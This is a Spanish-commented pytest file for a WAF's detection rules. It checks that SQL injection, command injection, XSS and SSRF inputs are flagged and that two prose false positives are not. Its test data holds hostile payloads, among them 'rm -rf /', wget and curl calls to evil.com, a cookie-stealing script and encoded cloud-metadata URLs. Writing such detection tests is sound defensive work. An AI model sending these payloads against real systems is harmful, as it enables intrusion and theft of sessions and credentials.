"""Deteccion: los FN que se cierran y los FP que se quitan (Fase 3).

Estos tests se escribieron ANTES de tocar las reglas (falla primero, se
arregla despues) y fijan el contrato:

- Los seis falsos negativos que se detectan con la version 0.6.0 tienen que
  detectarse: son vectores reales que un atacante usa sin que el WAF se
  entere.
- Los dos falsos positivos tienen que dejar de detectarse: son texto normal
  que un operador recibe cada dia (documentacion, una consulta que se
  describe en prosa).
- Los casos de referencia NO pueden cambiar: una regla que arregla un FP no
  puede perder una deteccion.

Medido antes de este commit (ver `.audit/f3_probe.py`):

| Caso | 0.6.0 |
|---|---|
| `' or ''=` | no detectado |
| `substring(version(),1,1)=5` | no detectado |
| `foo\\nrm -rf /` | no detectado |
| `http://2852039166/admin` (IP de metadata en decimal) | no detectado |
| `http://0xa9fea9fe/admin` (hex) | no detectado |
| `http://0252.0376.0252.0376/admin` (octal) | no detectado |
| `En el manual pone: <script> para incrustar codigo` | **xss** (falso positivo) |
| `La consulta sleep(8 hours) devuelve un error` | **sqli** (falso positivo) |
"""
from __future__ import annotations

import pytest

from gatekeeper.rules import scan


# ------------------------------------------------------- falsos negativos
#
# Cada uno es un vector real. Si alguno vuelve a "no detectado", el WAF
# tiene un agujero y el test lo dice.


@pytest.mark.parametrize(
    "payload",
    [
        # tautologia con literales vacios: el atacante cierra la comilla del
        # valor y mete la comparacion con cadena vacia.
        "' or ''=",
        "' or ''='",
        "1' or ''='",
        # booleano ciego con la forma invertida: la funcion de recorte va
        # primero y la comparacion con un digito detrás.
        "substring(version(),1,1)=5",
        "SUBSTRING(user(),1,1)=1",
        "mid(database(),1,1)>7",
        # un salto de linea ES un separador de comandos en shell.
        "foo\nrm -rf /",
        "nota\nwget http://evil.com/x.sh",
        # la IP de metadata escrita en decimal, hex y octal: el parser de
        # URL del navegador las resuelve igual.
        "http://2852039166/admin",
        "http://0xa9fea9fe/admin",
        "http://0252.0376.0252.0376/admin",
    ],
)
def test_los_falsos_negativos_se_detectan(payload: str):
    hit = scan(payload)
    assert hit is not None, f"no se detecta: {payload!r}"


def test_la_tautologia_con_comillas_vacias_es_sqli():
    assert scan("' or ''=") == "sqli"


def test_el_booleano_ciego_es_sqli():
    assert scan("substring(version(),1,1)=5") == "sqli"


def test_el_cmd_con_salto_de_linea_es_cmdi():
    assert scan("foo\nrm -rf /") == "cmdi"


@pytest.mark.parametrize(
    "payload",
    [
        "http://2852039166/admin",
        "http://0xa9fea9fe/admin",
        "http://0252.0376.0252.0376/admin",
    ],
)
def test_la_ip_de_metadata_en_cualquier_notacion_es_ssrf(payload: str):
    assert scan(payload) == "ssrf"


# ------------------------------------------------------- falsos positivos


@pytest.mark.parametrize(
    "payload",
    [
        # prosa que MENCIONA la etiqueta (documentacion, tutoriales, Stack
        # Overflow): no es un ataque.
        "En el manual pone: <script> para incrustar codigo",
        "usa <script> en tu pagina HTML",
        "el ejemplo <script> no deberia ir dentro de un atributo",
        # "sleep" con unidades es prosa, no una funcion SQL.
        "La consulta sleep(8 hours) devuelve un error de sintaxis",
        "el servidor hace sleep(8 hours) y luego responde",
    ],
)
def test_los_falsos_positivos_no_se_detectan(payload: str):
    hit = scan(payload)
    assert hit is None, f"falso positivo: {payload!r} -> {hit}"


# ------------------------------------------------------------- referencias
#
# Lo que hay que seguir detectando. Una regla que arregla un FP no puede
# perder una deteccion real.


@pytest.mark.parametrize(
    "payload",
    [
        "<script>alert(1)</script>",
        "<SCRIPT SRC=http://evil.com/x.js></SCRIPT>",
        "'\"><script>alert(document.cookie)</script>",
        "</title><script>alert(1)</script>",
        "<svg><script>alert(1)</script></svg>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "%253Cscript%253Ealert(1)",
        "<script>document.location='http://evil.com/'+document.cookie</script>",
    ],
)
def test_los_xss_reales_se_siguen_detectando(payload: str):
    assert scan(payload) == "xss", payload


@pytest.mark.parametrize(
    "payload",
    [
        "' or '1'='1",
        "1 AND SLEEP(5)",
        "1' AND SLEEP(5)--",
        "ASCII(SUBSTRING(user,1,1))>64",
        "; rm -rf /",
        "&& curl http://evil.com",
        "$(id)",
        "http://169.254.169.254/latest/meta-data/",
    ],
)
def test_las_detecciones_existentes_no_se_pierden(payload: str):
    assert scan(payload) is not None, payload


def test_sleep_con_unidades_no_pulsa_la_tautologia():
    """El FP era de la regla de `sleep`, no de la de tautologia."""
    from gatekeeper.rules import scan_detailed

    hit = scan_detailed("La consulta sleep(8 hours) devuelve un error")
    assert hit is None, hit
